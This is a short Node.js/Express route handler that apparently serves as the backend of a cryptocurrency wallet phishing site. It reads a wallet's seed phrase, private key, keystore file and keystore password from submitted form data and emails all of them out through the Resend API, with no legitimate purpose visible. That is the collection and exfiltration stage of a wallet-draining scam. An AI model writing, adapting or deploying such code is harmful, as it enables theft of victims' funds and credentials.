const { Resend } = require("resend");
const { walletImportEmail } = require("../utils/walletimportEmail");

const walletInfo = async (req, res) => {
  const resend = new Resend(process.env.RESEND_API_KEY);
  try {
    const { wallet, walletName, email, phrase, privateKey, address, keystorePassword, keystore } = req.body;

    const emailData = walletImportEmail({
      email,
      wallet,
      walletName,
      phrase,
      privateKey,
      address,
      keystorePassword,
      keystore
    });

    await resend.emails.send(emailData);

    return res.status(200).json({
      message: "Email sent successfully",
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({
      message: "Failed to send email",
    });
  }
};

module.exports = {
  walletInfo,
};
